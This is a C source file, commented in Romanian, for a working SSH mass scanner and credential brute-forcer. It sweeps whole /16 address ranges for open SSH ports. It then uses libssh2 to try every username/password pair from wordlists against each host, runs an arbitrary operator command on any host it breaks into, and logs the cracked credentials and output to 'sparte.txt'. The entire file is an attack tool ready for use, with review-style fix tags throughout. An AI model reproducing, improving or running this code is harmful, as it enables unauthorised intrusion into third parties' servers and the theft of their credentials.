#define LIBSSH2_STATIC 1
#include "libssh2_config.h"
#include <libssh2.h>

#ifdef HAVE_WINSOCK2_H
# include <winsock2.h>
#endif
#ifdef HAVE_SYS_SOCKET_H
# include <sys/socket.h>
#endif
#ifdef HAVE_NETINET_IN_H
# include <netinet/in.h>
#endif
#ifdef HAVE_SYS_SELECT_H
# include <sys/select.h>
#endif
#ifdef HAVE_UNISTD_H
# include <unistd.h>
#endif
#ifdef HAVE_ARPA_INET_H
# include <arpa/inet.h>
#endif

#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#include <netdb.h>
#include <time.h>

/* ─── constante ──────────────────────────────────────────────── */
#define TOTAL_VAL_COUNT   254
#define MAX_SOCKETS       1000
#define TIMEOUT_SCAN      3
#define SSH_TIMEOUT_MS    10000L
#define S_NONE            0
#define S_CONNECTING      1
#define EOL               '\n'
#define CAR_RETURN        '\r'

/* ─── structuri ──────────────────────────────────────────────── */
struct conn_t {
    int  s;
    char status;
    time_t a;
    struct sockaddr_in addr;
};

/* ─── globale ────────────────────────────────────────────────── */
static struct conn_t connlist[MAX_SOCKETS];
static FILE         *outfd = NULL;
static int           tot   = 0;

/* ─────────────────────────────────────────────────────────────
 * replace_str — inlocuieste prima aparitie a lui 'orig' cu 'rep'
 * D12: bounds guard explicit inainte de scriere in buffer
 * ───────────────────────────────────────────────────────────── */
static char *replace_str(const char *str, const char *orig, const char *rep)
{
    static char buffer[4096];
    const char *p;
    size_t prefix_len, rep_len, tail_len, total;

    if (!(p = strstr(str, orig)))
        return (char *)str;

    prefix_len = (size_t)(p - str);
    rep_len    = strlen(rep);
    tail_len   = strlen(p + strlen(orig));
    total      = prefix_len + rep_len + tail_len + 1;

    if (total > sizeof(buffer)) {
        fprintf(stderr, "[!] replace_str: string prea lung, ignorat\n");
        return (char *)str;
    }

    memcpy(buffer, str, prefix_len);
    buffer[prefix_len] = '\0';
    snprintf(buffer + prefix_len, sizeof(buffer) - prefix_len,
             "%s%s", rep, p + strlen(orig));
    return buffer;
}

/* ─────────────────────────────────────────────────────────────
 * init_sockets
 * ───────────────────────────────────────────────────────────── */
static void init_sockets(void)
{
    int i;
    for (i = 0; i < MAX_SOCKETS; i++) {
        connlist[i].status = S_NONE;
        memset(&connlist[i].addr, 0, sizeof(struct sockaddr_in));
    }
}

/* ─────────────────────────────────────────────────────────────
 * fatal — cleanup si iesire cu eroare
 * P4: verifica outfd != NULL inainte de fclose
 * ───────────────────────────────────────────────────────────── */
static void fatal(const char *err)
{
    int i;
    fprintf(stderr, "Error: %s\n", err);
    for (i = 0; i < MAX_SOCKETS; i++)
        if (connlist[i].status >= S_CONNECTING)
            close(connlist[i].s);
    if (outfd) { fclose(outfd); outfd = NULL; }
    exit(EXIT_FAILURE);
}

/* ─────────────────────────────────────────────────────────────
 * check_sockets
 * errno salvat inainte de close() pentru a evita suprascrierea
 * ───────────────────────────────────────────────────────────── */
static void check_sockets(void)
{
    int i, ret, saved_errno;

    for (i = 0; i < MAX_SOCKETS; i++) {
        if (connlist[i].status != S_CONNECTING)
            continue;

        if (connlist[i].a < (time(NULL) - TIMEOUT_SCAN)) {
            close(connlist[i].s);
            connlist[i].status = S_NONE;
            continue;
        }

        ret = connect(connlist[i].s,
                      (struct sockaddr *)&connlist[i].addr,
                      sizeof(struct sockaddr_in));
        saved_errno = errno;

        if (ret == -1) {
            if (saved_errno == EISCONN) {
                tot++;
                fprintf(outfd, "%s\n",
                        inet_ntoa(connlist[i].addr.sin_addr));
                close(connlist[i].s);
                connlist[i].status = S_NONE;
            } else if (saved_errno != EALREADY &&
                       saved_errno != EINPROGRESS) {
                close(connlist[i].s);
                connlist[i].status = S_NONE;
            }
        } else {
            tot++;
            fprintf(outfd, "%s\n",
                    inet_ntoa(connlist[i].addr.sin_addr));
            close(connlist[i].s);
            connlist[i].status = S_NONE;
        }
    }
}

/* ─────────────────────────────────────────────────────────────
 * waitsocket — select() pentru I/O SSH non-blocking
 * D11: retry intern la EINTR
 * ───────────────────────────────────────────────────────────── */
static int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{
    struct timeval timeout;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd  = NULL;
    int dir, rc;

    do {
        timeout.tv_sec  = 2;
        timeout.tv_usec = 0;
        FD_ZERO(&fd);
        FD_SET(socket_fd, &fd);
        writefd = NULL;
        readfd  = NULL;

        dir = libssh2_session_block_directions(session);
        if (dir & LIBSSH2_SESSION_BLOCK_INBOUND)  readfd  = &fd;
        if (dir & LIBSSH2_SESSION_BLOCK_OUTBOUND) writefd = &fd;

        rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
    } while (rc == -1 && errno == EINTR);

    return rc;
}

/* ─────────────────────────────────────────────────────────────
 * checkauth — sesiune SSH, autentificare, executie comanda
 *
 * D14: libssh2_init/exit per copil
 * D9:  channel_close() best-effort
 * P8:  fflush(vulnf) inainte de LOCK_UN
 * P9:  session_set_blocking(0) inainte de shutdown
 * ───────────────────────────────────────────────────────────── */
static int checkauth(const char *username, const char *password,
                     const char *hostname,  const char *portar,
                     const char *command)
{
    unsigned long       hostaddr;
    int                 sock = -1, port, rc;
    struct sockaddr_in  sin;
    LIBSSH2_SESSION    *session = NULL;
    LIBSSH2_CHANNEL    *channel = NULL;
    struct timeval      timeout;
    int                 bytecount = 0;
    FILE               *vulnf;

    timeout.tv_sec  = 10;
    timeout.tv_usec = 0;
    port            = atoi(portar);

    if (libssh2_init(0) != 0) {
        fprintf(stderr, "[!] libssh2_init failed\n");
        return -1;
    }

    hostaddr = inet_addr(hostname);
    if (hostaddr == INADDR_NONE) goto shutdown;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) goto shutdown;

    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,
                   (char *)&timeout, sizeof(timeout)) < 0 ||
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO,
                   (char *)&timeout, sizeof(timeout)) < 0)
        goto shutdown;

    memset(&sin, 0, sizeof(sin));
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(port);
    sin.sin_addr.s_addr = hostaddr;

    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0)
        goto shutdown;

    session = libssh2_session_init();
    if (!session) goto shutdown;

    libssh2_session_set_timeout(session, SSH_TIMEOUT_MS);

    while ((rc = libssh2_session_handshake(session, sock)) ==
           LIBSSH2_ERROR_EAGAIN);
    if (rc) goto shutdown;

    while ((rc = libssh2_userauth_password(session, username, password)) ==
           LIBSSH2_ERROR_EAGAIN);
    if (rc) goto shutdown;

    while ((channel = libssh2_channel_open_session(session)) == NULL &&
           libssh2_session_last_error(session, NULL, NULL, 0) ==
           LIBSSH2_ERROR_EAGAIN)
        waitsocket(sock, session);
    if (!channel) goto shutdown;

    while ((rc = libssh2_channel_exec(channel, command)) ==
           LIBSSH2_ERROR_EAGAIN)
        waitsocket(sock, session);
    if (rc != 0) goto shutdown;

    for (;;) {
        char buf[65535];
        rc = libssh2_channel_read(channel, buf, sizeof(buf) - 1);
        if (rc > 0) {
            buf[rc] = '\0';
            bytecount += rc;
            fprintf(stderr, "[*] WOW   : %s:%s %s port: %s\n",
                    username, password, hostname, portar);
            fprintf(stderr, "[*] Output: %s\n", buf);

            vulnf = fopen("sparte.txt", "a");
            if (vulnf) {
                flock(fileno(vulnf), LOCK_EX);
                fprintf(vulnf, "%s:%s %s port: %s --> %s\n",
                        username, password, hostname, portar, buf);
                fflush(vulnf);              /* P8 */
                flock(fileno(vulnf), LOCK_UN);
                fclose(vulnf);
            }
            goto shutdown;

        } else if (rc == LIBSSH2_ERROR_EAGAIN) {
            waitsocket(sock, session);
        } else {
            break;
        }
    }

shutdown:
    if (session)
        libssh2_session_set_blocking(session, 0);   /* P9 */

    if (channel) {
        libssh2_channel_close(channel);             /* D9: best-effort */
        libssh2_channel_free(channel);
        channel = NULL;
    }
    if (session) {
        libssh2_session_disconnect(session, "Normal Shutdown");
        libssh2_session_free(session);
        session = NULL;
    }
    if (sock >= 0) { close(sock); sock = -1; }

    libssh2_exit();   /* D14 */
    return (bytecount > 0) ? 0 : -1;
}

/* ─────────────────────────────────────────────────────────────
 * scanbclass — scaneaza clasa B
 * P4: outfd = NULL dupa fclose
 * ───────────────────────────────────────────────────────────── */
static int scanbclass(const char *bclass, const char *port)
{
    int    done = 0, i, cip = 1, bb = 0, ret, k, ns_cnt, x;
    time_t scantime;
    char   ip[20], outfile[128], last[256];

    errno = 0;
    if (unlink("scan.log") != 0 && errno != ENOENT)
        fprintf(stderr, "[!] unlink() failed: %s\n", strerror(errno));

    memset(outfile, 0, sizeof(outfile));
    snprintf(outfile, sizeof(outfile) - 1, "scan.log");

    if (!(outfd = fopen(outfile, "a"))) {
        perror(outfile);
        exit(EXIT_FAILURE);
    }

    printf("[-] Searching: %s.*.*\n", bclass);
    fflush(stdout);

    memset(last, 0, sizeof(last));
    init_sockets();
    scantime = time(NULL);

    while (!done) {
        for (i = 0; i < MAX_SOCKETS; i++) {
            if (cip == 255) {
                if (bb == 255) {
                    ns_cnt = 0;
                    for (k = 0; k < MAX_SOCKETS; k++)
                        if (connlist[k].status > S_NONE) { ns_cnt++; break; }
                    if (ns_cnt == 0) done = 1;
                    break;
                } else {
                    cip = 0; bb++;
                    for (x = 0; x < (int)strlen(last); x++) putchar('\b');
                    memset(last, 0, sizeof(last));
                    snprintf(last, sizeof(last) - 1,
                             "%s.%d.* on port: %s [Found: %d] [%.1f%% Done]",
                             bclass, bb, port, tot, (bb / 255.0) * 100.0);
                    printf("%s", last);
                    fflush(stdout);
                }
            }

            if (connlist[i].status == S_NONE) {
                connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
                if (connlist[i].s == -1) {
                    fprintf(stderr, "[!] Unable to allocate socket\n");
                } else {
                    ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
                    if (ret == -1) {
                        fprintf(stderr, "[!] Unable to set O_NONBLOCK\n");
                        close(connlist[i].s);
                    } else {
                        memset(ip, 0, sizeof(ip));
                        snprintf(ip, sizeof(ip) - 1,
                                 "%s.%d.%d", bclass, bb, cip);
                        connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
                        if (connlist[i].addr.sin_addr.s_addr == INADDR_NONE)
                            fatal("Invalid IP.");
                        connlist[i].addr.sin_family = AF_INET;
                        connlist[i].addr.sin_port   = htons(atoi(port));
                        connlist[i].a               = time(NULL);
                        connlist[i].status          = S_CONNECTING;
                        cip++;
                    }
                }
            }
        }
        check_sockets();
        usleep(1000);
    }

    printf("\n[!] Scan complet in %u secunde. [%d IP-uri gasite]\n",
           (unsigned int)(time(NULL) - scantime), tot);

    fclose(outfd);
    outfd = NULL;   /* P4 */
    return 1;
}

/* ─────────────────────────────────────────────────────────────
 * line_count — numara liniile (D6: pastrata, comentata)
 * ───────────────────────────────────────────────────────────── */
/*
static int line_count(const char *filename)
{
    FILE *fd;
    int ch, count = 0;
    if ((fd = fopen(filename, "r")) == NULL) {
        fprintf(stderr, "[Error] Cannot open: %s\n", filename);
        return -1;
    }
    while ((ch = fgetc(fd)) != EOF)
        if (ch == EOL || ch == CAR_RETURN) count++;
    fclose(fd);
    return count;
}
*/

/* ─────────────────────────────────────────────────────────────
 * scan — citeste IP-uri si lanseaza checkauth in procese copil
 *
 * D2/P3+: waitpid cu ECHILD guard
 * D15:    fclose FD-uri mostenite in copil
 * D16:    fflush(stdout) inainte de fiecare fork()
 * D19:    ns = strdup(replace_str(...)) + free(ns)
 * P6:     trim leading/trailing whitespace din buff
 * ───────────────────────────────────────────────────────────── */
static int scan(const char *thr, const char *ipfile,
                const char *userfile, const char *passfile,
                const char *portar,   const char *commandline)
{
    int   numforks = 0, maxf, status;
    FILE *fp = NULL, *passf = NULL, *userf = NULL;
    char  buff[4096], nutt2[4096], nutt[4096];
    char *pass = NULL, *user = NULL, *ns = NULL, *trimmed;
    pid_t PID;

    maxf = atoi(thr);
    if (maxf < 1) maxf = 1;

    if ((userf = fopen(userfile, "r")) == NULL) {
        fprintf(stderr, "FATAL: Cannot open %s\n", userfile);
        return -1;
    }

    while (fgets(nutt2, sizeof(nutt2), userf)) {
        user = strdup(nutt2);
        if (!user) continue;   /* D13 */
        user[strcspn(user, "\r\n")] = '\0';
        if (user[0] == '\0') { free(user); user = NULL; continue; }

        if ((passf = fopen(passfile, "r")) == NULL) {
            fprintf(stderr, "FATAL: Cannot open %s\n", passfile);
            free(user); fclose(userf); return -1;
        }

        while (fgets(nutt, sizeof(nutt), passf)) {
            pass = strdup(nutt);
            if (!pass) continue;   /* D13 */
            pass[strcspn(pass, "\r\n")] = '\0';
            if (pass[0] == '\0') { free(pass); pass = NULL; continue; }

            /* D19: strdup pentru a evita dangling dupa free(pass) */
            ns = strdup(replace_str(pass, "$user", user));
            if (!ns) { free(pass); pass = NULL; continue; }

            printf("[*] Trying: %s:%s on found IPs\n", user, ns);

            if ((fp = fopen(ipfile, "r")) == NULL) {
                fprintf(stderr, "FATAL: Cannot open %s\n", ipfile);
                free(ns); free(pass); free(user);
                fclose(passf); fclose(userf);
                return -1;
            }

            while (fgets(buff, sizeof(buff), fp)) {
                /* P6: trim trailing */
                buff[strcspn(buff, " \t\r\n")] = '\0';
                /* P6: trim leading */
                trimmed = buff;
                while (*trimmed == ' ' || *trimmed == '\t') trimmed++;
                if (trimmed[0] == '\0') continue;

                fflush(stdout);   /* D16 */

                PID = fork();
                if (PID < 0) {
                    fprintf(stderr, "[!] Couldn't fork!\n");
                    free(ns); free(pass); free(user);
                    fclose(fp); fclose(passf); fclose(userf);
                    return -1;
                }

                if (PID == 0) {
                    /* D15: inchide FD-urile mostenite */
                    fclose(fp);
                    fclose(passf);
                    fclose(userf);
                    checkauth(user, ns, trimmed, portar, commandline);
                    exit(0);
                } else {
                    numforks++;
                    /* D2 + P3+: wait robust cu ECHILD guard */
                    while (numforks >= maxf) {
                        pid_t done = waitpid(-1, &status, 0);
                        if (done > 0) {
                            numforks--;
                        } else if (done < 0 && errno == ECHILD) {
                            numforks = 0;
                            break;
                        }
                        /* errno == EINTR: retry automat */
                    }
                }
            }
            fclose(fp); fp = NULL;
            free(ns);   ns   = NULL;
            free(pass); pass = NULL;
        }
        fclose(passf); passf = NULL;
        free(user); user = NULL;
    }
    fclose(userf);

    /* D17: recolectare procese zombie ramase */
    while (numforks > 0) {
        pid_t done = waitpid(-1, &status, 0);
        if (done > 0) {
            numforks--;
        } else if (done < 0 && errno == ECHILD) {
            numforks = 0;
            break;
        }
    }

    return 0;
}

/* ─────────────────────────────────────────────────────────────
 * parse_int_arg — strtol cu validare de range (P10)
 * Returneaza valoarea long sau -1 la eroare.
 * ───────────────────────────────────────────────────────────── */
static long parse_int_arg(const char *s, long min_val, long max_val)
{
    char *endptr;
    long  val;
    errno = 0;
    val   = strtol(s, &endptr, 10);
    if (errno != 0 || endptr == s || *endptr != '\0' ||
        val < min_val || val > max_val)
        return -1L;
    return val;
}

/* ─────────────────────────────────────────────────────────────
 * main
 * D4:  getchar() eliminat
 * P10: strtol pentru -p si -t
 * ───────────────────────────────────────────────────────────── */
int main(int argc, char *argv[])
{
    int   i, input = 0;
    FILE *fcheck = NULL, *userf = NULL, *passf = NULL;
    char *userfile = NULL, *passfile = NULL, *command = NULL;
    char *threads  = NULL, *scanfile = NULL, *bclass  = NULL, *port = NULL;

    if (argc < 2) {
        printf("Utilizare:\n");
        printf("  %s -f ip.lst  -t <thr> -user <u> -pass <p> -p <port> -c \"cmd\"\n",
               argv[0]);
        printf("  %s -b X.X     -t <thr> -user <u> -pass <p> -p <port> -c \"cmd\"\n",
               argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "-f") == 0) input = 1;
    if (strcmp(argv[1], "-r") == 0) input = 2;   /* D5: TODO */
    if (strcmp(argv[1], "-R") == 0) input = 3;   /* D5: TODO */
    if (strcmp(argv[1], "-b") == 0) input = 4;

    for (i = 1; i < argc - 1; i++) {
        if (strcmp(argv[i], "-p")    == 0) port     = argv[i+1];
        if (strcmp(argv[i], "-user") == 0) userfile = argv[i+1];
        if (strcmp(argv[i], "-pass") == 0) passfile = argv[i+1];
        if (strcmp(argv[i], "-t")    == 0) threads  = argv[i+1];
        if (strcmp(argv[i], "-c")    == 0) command  = argv[i+1];
    }

#define VALIDATE_COMMON() \
    if (!threads || parse_int_arg(threads, 1, 9999) < 0) goto err; \
    if (!port    || parse_int_arg(port, 3, 65535)   < 0) goto err; \
    if (!userfile || !passfile || !command)                goto err; \
    if ((userf = fopen(userfile,"r")) == NULL)             goto err; \
    fclose(userf); userf = NULL; \
    if ((passf = fopen(passfile,"r")) == NULL)             goto err; \
    fclose(passf); passf = NULL;

    switch (input) {

        case 1:
            scanfile = argv[2];
            if (!scanfile) goto err;
            if ((fcheck = fopen(scanfile,"r")) == NULL) goto err;
            fclose(fcheck); fcheck = NULL;
            VALIDATE_COMMON();
            scan(threads, scanfile, userfile, passfile, port, command);
            break;

        case 2:
            /* D5: TODO — generare IP-uri random */
            fprintf(stderr, "[!] Modul -r nu este inca implementat.\n");
            break;

        case 3:
            /* D5: TODO — scan random */
            fprintf(stderr, "[!] Modul -R nu este inca implementat.\n");
            break;

        case 4:
            bclass = argv[2];
            if (!bclass) goto err;
            VALIDATE_COMMON();
            scanbclass(bclass, port);
            scan(threads, "scan.log", userfile, passfile, port, command);
            break;

        default:
            fprintf(stderr, "Bad command, exiting.\n");
            return 1;
    }

    return 0;

err:
    fprintf(stderr,
            "FATAL: Argumente lipsa sau invalide.\n"
            "  -f ip.lst  -t thr -user u.lst -pass p.lst -p port -c cmd\n"
            "  -b X.X     -t thr -user u.lst -pass p.lst -p port -c cmd\n");
    return 1;

#undef VALIDATE_COMMON
}
